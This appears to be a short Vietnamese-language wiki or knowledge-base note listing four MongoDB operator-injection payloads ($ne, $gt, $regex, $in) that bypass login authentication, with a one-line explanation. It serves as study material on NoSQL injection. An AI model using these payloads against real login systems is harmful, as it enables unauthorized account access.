---
title: MongoDB Authentication Bypass Payloads
type: entity
related: [[MongoDB Authentication Bypass]]
---

Các payload được nhắc đến:

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
```

Chúng minh họa operator injection vào login query.